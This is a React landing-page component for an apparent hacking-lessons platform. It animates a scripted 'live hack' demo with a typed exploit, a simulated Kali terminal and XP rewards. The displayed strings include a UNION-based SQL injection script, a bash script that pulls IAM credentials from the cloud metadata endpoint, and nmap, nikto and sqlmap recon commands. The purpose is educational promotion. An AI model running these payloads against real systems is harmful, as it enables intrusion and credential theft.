import React, { useState, useEffect, useRef } from 'react';
import { Shield, Layers, Target, BookOpen, FlaskConical, Crown, X, Terminal as TerminalIcon, CheckCircle, ArrowRight, Zap } from 'lucide-react';
import { useNavigate } from 'react-router-dom';

const AppReveal = () => {
    const navigate = useNavigate();

    // Live Hack Simulation State
    const [hackStep, setHackStep] = useState(0);
    const [sequenceIndex, setSequenceIndex] = useState(0);
    const [displayCode, setDisplayCode] = useState("");
    const [attackIndex, setAttackIndex] = useState(0);

    // 100% Kali Realism: Terminal Handshake State
    const [terminalStep, setTerminalStep] = useState(0);
    const [terminalTypedText, setTerminalTypedText] = useState("");
    const [terminalLogs, setTerminalLogs] = useState([]);
    const terminalBodyRef = useRef(null);

    // Auto-scroll terminal — gentle nudge to keep latest output visible
    useEffect(() => {
        if (terminalBodyRef.current) {
            const el = terminalBodyRef.current;
            const scrollTimeout = setTimeout(() => {
                el.scrollBy({ top: 10, behavior: 'smooth' });
            }, 50);
            return () => clearTimeout(scrollTimeout);
        }
    }, [terminalLogs, terminalTypedText, hackStep]);

    const attacks = [
        {
            url: "bugora.app/lessons/advanced-sql-discovery",
            fileName: "exploit.py",
            fileExt: "python",
            keystrokes: "import requests\n\ntarget = \"http://api.target.com\"\npayload = \"' UNION SELECT user(),db()--\"\n\nr = requests.get(f\"{target}/users?id={payload}\")\nprint(r.json())",
            tokens: [
                { text: "import", type: "keyword" },
                { text: " requests\n\n", type: "plain" },
                { text: "target", type: "variable" },
                { text: " = ", type: "operator" },
                { text: "\"http://api.target.com\"", type: "string" },
                { text: "\n", type: "plain" },
                { text: "payload", type: "variable" },
                { text: " = ", type: "operator" },
                { text: "\"' UNION SELECT user(),db()--\"", type: "string" },
                { text: "\n\n", type: "plain" },
                { text: "r", type: "variable" },
                { text: " = requests.", type: "plain" },
                { text: "get", type: "method" },
                { text: "(", type: "plain" },
                { text: "f\"{target}/users?id={payload}\"", type: "string" },
                { text: ")\n", type: "plain" },
                { text: "print", type: "keyword" },
                { text: "(r.json())", type: "plain" }
            ],
            terminal: [
                { text: "[*] Connecting to api.target.com...", type: "info", delay: 0.5 },
                { text: "[+] Connection OK. Latency: 42ms", type: "success", delay: 1.5 },
                { text: "[*] Injecting UNION payload on /users?id=", type: "info", delay: 3.0 },
                { text: "[!] HTTP 500 — error on 'id' param", type: "info", delay: 4.5 },
                { text: "[+] Injectable: UNION SELECT user(),db()--", type: "success", delay: 6.0 },
                { text: "[+] Extracted: root@localhost | vault_prod", type: "success", delay: 7.5 },
                { text: "[+] 4 tables: users, sessions, api_keys, logs", type: "success", delay: 9.0 }
            ],
            summary: "Union-based SQL Injection successful. Extracted database 'vault_prod' and confirmed 'root' access. Database schema exposed."
        },
        {
            url: "bugora.app/lessons/ssrf-iam-pillage",
            fileName: "ssrf.sh",
            fileExt: "sh",
            keystrokes: "#!/bin/bash\n\nMETA=\"http://169.254.169.254\"\nROLE=$(curl -s $META/latest/iam/)\n\nCREDS=$(curl -s $META/iam/$ROLE)\necho $CREDS | jq '.AccessKeyId'",
            tokens: [
                { text: "#!/bin/bash", type: "comment" },
                { text: "\n\n", type: "plain" },
                { text: "META", type: "variable" },
                { text: "=", type: "operator" },
                { text: "\"http://169.254.169.254\"", type: "string" },
                { text: "\n", type: "plain" },
                { text: "ROLE", type: "variable" },
                { text: "=", type: "operator" },
                { text: "$(", type: "plain" },
                { text: "curl", type: "method" },
                { text: " -s $META/latest/iam/)\n\n", type: "plain" },
                { text: "CREDS", type: "variable" },
                { text: "=", type: "operator" },
                { text: "$(", type: "plain" },
                { text: "curl", type: "method" },
                { text: " -s $META/iam/$ROLE)\n", type: "plain" },
                { text: "echo", type: "keyword" },
                { text: " $CREDS | ", type: "plain" },
                { text: "jq", type: "method" },
                { text: " '.AccessKeyId'", type: "string" }
            ],
            terminal: [
                { text: "[*] Probing metadata endpoint...", type: "info", delay: 0.8 },
                { text: "[+] Tunnel established at 10.0.42.12", type: "success", delay: 1.8 },
                { text: "[*] Found role: web-app-production-role", type: "info", delay: 3.0 },
                { text: "[!] Credentials found for production-role!", type: "success", delay: 4.5 },
                { text: "[+] AccessKeyId: ASIA... | Secret: [REDACTED]", type: "success", delay: 6.0 },
                { text: "[+] Token: FwoGZXIvYXdz... (3600s)", type: "success", delay: 7.5 },
                { text: "[+] s3://prod-backups | s3://config-vault", type: "success", delay: 9.0 }
            ],
            summary: "SSRF exploit bypassed proxy to exfiltrate IAM credentials. Session hijack completed."
        }
    ];

    const currentAttack = attacks[attackIndex];

    useEffect(() => {
        let timeout;

        // --- 1. Code Editor Typing Phase ---
        if (hackStep === 0) {
            if (sequenceIndex < currentAttack.keystrokes.length) {
                const char = currentAttack.keystrokes[sequenceIndex];
                const delay = Math.random() * 40 + 30; // High speed but smooth
                timeout = setTimeout(() => {
                    setDisplayCode(prev => prev + char);
                    setSequenceIndex(prev => prev + 1);
                }, delay);
            } else {
                // Done typing code: transition to terminal handshake
                timeout = setTimeout(() => setHackStep(1), 800);
            }
        }

        // --- 2. Terminal Handshake Phase ---
        else if (hackStep === 1) {
            // Each attack gets its own set of cool terminal commands
            const cmdSets = [
                // Attack 0: SQLi — recon + exploitation workflow
                [
                    {
                        cmd: "nmap -sV -p 80,443 api.target.com", dir: "~", output: [
                            { text: "Starting Nmap 7.94 ( https://nmap.org )", type: "info" },
                            { text: "PORT   STATE SERVICE VERSION", type: "info" },
                            { text: "80/tcp open  http    Apache/2.4.52", type: "success" },
                            { text: "443/tcp open ssl/http nginx 1.18.0", type: "success" },
                        ]
                    },
                    {
                        cmd: "nikto -h api.target.com -Tuning 9", dir: "~", output: [
                            { text: "+ Target IP:   203.0.113.42", type: "info" },
                            { text: "+ OSVDB-3092: /users?id=: Parameter 'id' injectable", type: "success" },
                        ]
                    },
                    {
                        cmd: "sqlmap -u \"api.target.com/users?id=1\" --dbs", dir: "~", output: [
                            { text: "[*] testing connection to the target URL", type: "info" },
                            { text: "[!] parameter 'id' is vulnerable. Type: UNION query", type: "success" },
                            { text: "[+] available databases: vault_prod, information_schema", type: "success" },
                        ]
                    },
                    { cmd: "python3 exploit.py", dir: "~/labs", output: [] }
                ],
                // Attack 1: SSRF — cloud recon + IAM workflow
                [
                    {
                        cmd: "curl -s http://169.254.169.254/latest/meta-data/", dir: "~", output: [
                            { text: "ami-id\ninstance-type\niam/", type: "info" },
                        ]
                    },
                    {
                        cmd: "aws sts get-caller-identity --profile stolen", dir: "~", output: [
                            { text: '{ "Account": "314159265358", "Arn": "arn:aws:iam::role/web-app-prod" }', type: "success" },
                        ]
                    },
                    {
                        cmd: "nmap -sn 10.0.0.0/24 --open", dir: "~", output: [
                            { text: "Nmap scan report for 10.0.0.12 (svc.internal-proxy)", type: "info" },
                            { text: "Host is up (0.0023s latency). 3 hosts discovered.", type: "success" },
                        ]
                    },
                    { cmd: "bash ssrf.sh", dir: "~/labs", output: [] }
                ]
            ];

            const commands = cmdSets[attackIndex] || cmdSets[0];
            const currentEntry = commands[terminalStep];

            if (!currentEntry) {
                // All commands done — go to execution phase
                setHackStep(2);
            } else if (terminalTypedText.length < currentEntry.cmd.length) {
                // Type the command character by character
                const char = currentEntry.cmd[terminalTypedText.length];
                timeout = setTimeout(() => {
                    setTerminalTypedText(prev => prev + char);
                }, 45);
            } else {
                // Command typed — press "Enter": add command + output, advance
                timeout = setTimeout(() => {
                    setTerminalLogs(prev => [
                        ...prev,
                        { text: currentEntry.cmd, type: "command", dir: currentEntry.dir },
                        ...currentEntry.output
                    ]);
                    setTerminalStep(prev => prev + 1);
                    setTerminalTypedText("");
                }, 400);
            }
        }

        // --- 3. Execution Phase (Logs appearing) ---
        else if (hackStep === 2) {
            timeout = setTimeout(() => setHackStep(3), 6500);
        }

        return () => clearTimeout(timeout);
    }, [sequenceIndex, hackStep, terminalStep, terminalTypedText, currentAttack, attackIndex]);

    const nextAttack = () => {
        if (attackIndex < attacks.length - 1) {
            setAttackIndex(prev => prev + 1);
            setSequenceIndex(0);
            setDisplayCode("");
            setHackStep(0);
            setTerminalStep(0);
            setTerminalTypedText("");
            setTerminalLogs([]);
        } else {
            navigate('/challenges');
        }
    };

    const resetSimulation = () => {
        setSequenceIndex(0);
        setDisplayCode("");
        setHackStep(0);
        setAttackIndex(0);
        setTerminalStep(0);
        setTerminalTypedText("");
        setTerminalLogs([]);
    };

    const renderCode = () => {
        let remainingDisplay = displayCode;

        return currentAttack.tokens.map((token, index) => {
            if (remainingDisplay.length === 0) return null;

            const tokenLen = token.text.length;
            const content = remainingDisplay.slice(0, tokenLen);
            remainingDisplay = remainingDisplay.slice(tokenLen);

            return (
                <span key={`${attackIndex}-${index}`} className={`c-${token.type}`}>
                    {content}
                </span>
            );
        });
    };

    return (
        <section className="app-reveal">
            <div className="landing-container">
                <div className="reveal-wrapper animate-fade-in-up" style={{ animationDelay: '0.3s' }}>
                    <div className="reveal-glass">
                        {/* Browser Header */}
                        <div className="reveal-header">
                            <div className="header-controls">
                                <div className="dot red"></div>
                                <div className="dot yellow"></div>
                                <div className="dot green"></div>
                            </div>
                            <div className="header-address-bar">
                                <Shield size={12} className="lock-icon" />
                                <span className="protocol">https://</span>
                                <span className="domain">{currentAttack.url.split('/')[0]}</span>
                                <span className="path">/{currentAttack.url.split('/').slice(1).join('/')}</span>
                            </div>
                        </div>

                        <div className="reveal-body">
                            <div className="reveal-app-layout">
                                {/* Sidebar */}
                                <div className="reveal-sidebar">
                                    <div className="sidebar-group">
                                        <div className="sidebar-icon active" title="Explorer"><Layers size={22} /></div>
                                        <div className="sidebar-icon" title="Search"><Target size={22} /></div>
                                        <div className="sidebar-icon" title="Source Control"><BookOpen size={22} /></div>
                                    </div>
                                    <div className="sidebar-group bottom">
                                        <div className="sidebar-icon" title="Extensions"><FlaskConical size={22} /></div>
                                        <div className="sidebar-icon" title="Profile"><Crown size={22} /></div>
                                    </div>
                                </div>

                                <div className="reveal-main">
                                    <div className="simulation-container">
                                        {/* Code Editor Header */}
                                        <div className="editor-header-tabs">
                                            <div className="tab active">
                                                <span className={`file-icon ${currentAttack.fileExt}`}>{currentAttack.fileExt}</span>
                                                <span className="tab-name">{currentAttack.fileName}</span>
                                                <X size={10} className="close-x" />
                                            </div>
                                            <div className="tab">
                                                <span className="file-icon">txt</span>
                                                <span className="tab-name">recon.log</span>
                                            </div>
                                            {hackStep === 1 && (
                                                <div className="editor-status-badge running animate-pulse">
                                                    <span className="desktop-text">Executing...</span>
                                                    <span className="mobile-text">Running</span>
                                                </div>
                                            )}
                                        </div>

                                        {/* Code Editor Body */}
                                        <div className="editor-content">
                                            <div className="line-numbers">
                                                {[1, 2, 3, 4, 5, 6, 7, 8].map(n => <div key={n}>{n}</div>)}
                                            </div>
                                            <div className="code-area">
                                                <pre>{renderCode()}<span className="cursor-block"></span></pre>
                                            </div>
                                        </div>

                                        {/* Terminal Output */}
                                        <div className={`terminal-drawer ${hackStep >= 1 ? 'open' : ''}`}>
                                            <div className="terminal-header">
                                                <div className="term-tabs">
                                                    <span className="term-tab active">TERMINAL</span>
                                                    <span className="term-tab">OUTPUT</span>
                                                    <span className="term-tab">DEBUG</span>
                                                </div>
                                            </div>
                                            <div className="terminal-body" ref={terminalBodyRef}>
                                                {/* Handshake: Executed Commands History */}
                                                {terminalLogs.map((log, i) => (
                                                    <div key={`log-${i}`} className={`term-line ${log.type}`}>
                                                        {log.type === 'command' ? (
                                                            <div className="prompt-wrapper">
                                                                <span className="prompt-user">root@kali</span>
                                                                <span className="prompt-sep">:</span>
                                                                <span className="prompt-dir">{log.dir || '~'}</span>
                                                                <span className="prompt-char">#</span>
                                                                <span className="typed-text ml-2">{log.text}</span>
                                                            </div>
                                                        ) : (
                                                            <div className="pre-output">{log.text}</div>
                                                        )}
                                                    </div>
                                                ))}

                                                {/* Active Typing Handshake */}
                                                {hackStep === 1 && (() => {
                                                    const cmdSets = [
                                                        [{ dir: "~" }, { dir: "~" }, { dir: "~" }, { dir: "~/labs" }],
                                                        [{ dir: "~" }, { dir: "~" }, { dir: "~" }, { dir: "~/labs" }]
                                                    ];
                                                    const activeDir = (cmdSets[attackIndex] || cmdSets[0])[terminalStep]?.dir || "~";
                                                    return (
                                                        <div className="term-line command">
                                                            <span className="prompt-user">root@kali</span>
                                                            <span className="prompt-sep">:</span>
                                                            <span className="prompt-dir">
                                                                {activeDir}
                                                            </span>
                                                            <span className="prompt-char">#</span>
                                                            <span className="typed-text ml-2">
                                                                {terminalTypedText}
                                                                <span className="terminal-cursor"></span>
                                                            </span>
                                                        </div>
                                                    );
                                                })()}

                                                {/* Main Hacking Execution Logs */}
                                                {hackStep >= 2 && currentAttack.terminal.map((line, i) => (
                                                    <div key={`hack-log-${i}`} className={`term-line ${line.type} animate-type`} style={{ animationDelay: `${line.delay}s` }}>
                                                        {line.text}
                                                    </div>
                                                ))}
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {/* Victory Modal — positioned at reveal-body level for full coverage */}
                            {hackStep >= 3 && (
                                <div className="simulation-modal-overlay">
                                    <div className="victory-modal animate-pop-in">
                                        <div className="victory-glow"></div>
                                        <div className="victory-icon-wrapper">
                                            <div className="victory-ring"></div>
                                            <CheckCircle size={36} className="victory-icon" />
                                        </div>

                                        <h3 className="victory-title">
                                            {attackIndex === 0 ? "Vulnerability Found" : "System Compromised"}
                                        </h3>

                                        {/* Attack Result Terminal UI */}
                                        <div className="modal-result-terminal">
                                            <div className="mt-header">
                                                <TerminalIcon size={12} />
                                                <span>Execution Result - payload.py</span>
                                            </div>
                                            <div className="mt-body">
                                                <div className="mt-line success">
                                                    {currentAttack.summary}
                                                </div>
                                                <div className="mt-line cursor">_</div>
                                            </div>
                                        </div>

                                        <div className="xp-gain">
                                            <span className="plus">+</span>{attackIndex === 0 ? "50" : "150"} <span className="unit">XP</span>
                                        </div>

                                        <button
                                            className="btn-victory-primary"
                                            onClick={nextAttack}
                                        >
                                            {attackIndex === 0 ? (
                                                <>Next Phase <ArrowRight size={16} /></>
                                            ) : (
                                                <><Zap size={16} fill="currentColor" /> Access Real Lab</>
                                            )}
                                        </button>
                                        <button className="btn-victory-text" onClick={resetSimulation}>
                                            Reset Lab
                                        </button>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>

                    <div className="floating-stat s1">
                        <Layers size={14} /> 50+ Real Labs
                    </div>
                </div>
            </div>
        </section>
    );
};

export default AppReveal;
